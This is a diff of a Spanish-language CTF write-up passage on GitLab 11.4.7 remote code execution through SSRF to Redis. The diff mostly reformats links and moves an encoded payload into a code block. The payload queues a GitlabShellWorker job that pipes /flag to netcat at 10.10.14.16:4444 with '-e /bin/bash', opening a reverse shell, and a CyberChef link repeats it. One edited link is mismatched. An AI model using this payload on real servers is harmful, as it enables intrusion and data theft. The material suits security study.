@@ -100,8 +100,8 @@ Honestamente, no me funcionaron ninguno de los dos, pero me da una cierta idea, 
 Una simple busqueda en Google y obtenemos el siguiente resource  junto a un video explicativo:
 
 > * [https://liveoverflow.com/gitlab-11-4-7-remote-code-execution-real-world-ctf-2018/](https://liveoverflow.com/gitlab-11-4-7-remote-code-execution-real-world-ctf-2018/)
-> * https://www.youtube.com/watch?v=LrLJuyAdoAg
-> * https://hackerone.com/reports/299473
+> * [https://www.youtube.com/watch?v=LrLJuyAdoAg](https://www.youtube.com/watch?v=LrLJuyAdoAg)
+> * [https://hackerone.com/reports/299473](https://www.youtube.com/watch?v=LrLJuyAdoAg)
 
 Creamos un nuevo proyecto:
 
@@ -127,7 +127,9 @@ git://[0:0:0:0:0:ffff:127.0.0.1]:6379/
 
 El payload debe estar ***Encoded*** , este caso queda asi :
 
-`git://[0:0:0:0:0:ffff:127.0.0.1]:6379/%0A%20multi%0A%20sadd%20resque:gitlab:queues%20system_hook_push%0A%20lpush%20resque:gitlab:queue:system_hook_push%20%22%7B%5C%22class%5C%22:%5C%22GitlabShellWorker%5C%22,%5C%22args%5C%22:%5B%5C%22class_eval%5C%22,%5C%22open(%5C'%7Ccat%20/flag%20%7C%20nc%2010.10.14.16%204444%20-e%20/bin/bash%20%5C').read%5C%22%5D,%5C%22retry%5C%22:3,%5C%22queue%5C%22:%5C%22system_hook_push%5C%22,%5C%22jid%5C%22:%5C%22ad52abc5641173e217eb2e52%5C%22,%5C%22created_at%5C%22:1513714403.8122594,%5C%22enqueued_at%5C%22:1513714403.8129568%7D%22%0A%20exec%0A%20exec%0A/ssrf.git`
+```bash
+git://[0:0:0:0:0:ffff:127.0.0.1]:6379/%0A%20multi%0A%20sadd%20resque:gitlab:queues%20system_hook_push%0A%20lpush%20resque:gitlab:queue:system_hook_push%20%22%7B%5C%22class%5C%22:%5C%22GitlabShellWorker%5C%22,%5C%22args%5C%22:%5B%5C%22class_eval%5C%22,%5C%22open(%5C'%7Ccat%20/flag%20%7C%20nc%2010.10.14.16%204444%20-e%20/bin/bash%20%5C').read%5C%22%5D,%5C%22retry%5C%22:3,%5C%22queue%5C%22:%5C%22system_hook_push%5C%22,%5C%22jid%5C%22:%5C%22ad52abc5641173e217eb2e52%5C%22,%5C%22created_at%5C%22:1513714403.8122594,%5C%22enqueued_at%5C%22:1513714403.8129568%7D%22%0A%20exec%0A%20exec%0A/ssrf.git
+```
 
 * > [CyberChef referencia URL Encoded](https://gchq.github.io/CyberChef/#recipe=URL_Encode(false)&input=CiBtdWx0aQogc2FkZCByZXNxdWU6Z2l0bGFiOnF1ZXVlcyBzeXN0ZW1faG9va19wdXNoCiBscHVzaCByZXNxdWU6Z2l0bGFiOnF1ZXVlOnN5c3RlbV9ob29rX3B1c2ggIntcImNsYXNzXCI6XCJHaXRsYWJTaGVsbFdvcmtlclwiLFwiYXJnc1wiOltcImNsYXNzX2V2YWxcIixcIm9wZW4oXCd8Y2F0IC9mbGFnIHwgbmMgMTAuMTAuMTQuMjMgNDQ0NCAtZSAvYmluL2Jhc2ggXCcpLnJlYWRcIl0sXCJyZXRyeVwiOjMsXCJxdWV1ZVwiOlwic3lzdGVtX2hvb2tfcHVzaFwiLFwiamlkXCI6XCJhZDUyYWJjNTY0MTE3M2UyMTdlYjJlNTJcIixcImNyZWF0ZWRfYXRcIjoxNTEzNzE0NDAzLjgxMjI1OTQsXCJlbnF1ZXVlZF9hdFwiOjE1MTM3MTQ0MDMuODEyOTU2OH0iCiBleGVjCiBleGVjCi9zc3JmLmdpdA)
 
